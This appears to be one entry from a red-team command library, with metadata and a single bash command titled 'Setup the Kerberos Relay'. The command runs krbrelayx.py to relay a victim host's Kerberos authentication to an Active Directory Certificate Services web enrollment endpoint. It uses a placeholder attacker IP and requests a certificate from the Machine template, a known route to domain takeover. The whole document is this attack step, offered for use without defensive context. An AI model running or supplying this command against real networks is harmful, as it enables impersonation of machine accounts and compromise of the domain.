---
id: 6261fd62-a4e9-4604-b843-93905c3730d4
name: Setup the Kerberos Relay
type: command
executor: bash
data: sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local
  --adcs --template Machine
output: null
created_at: '2023-04-06T03:56:05.989395+00:00'
updated_at: '2023-04-10T20:26:16.822815+00:00'
---

# Setup the Kerberos Relay

```bash
sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
```


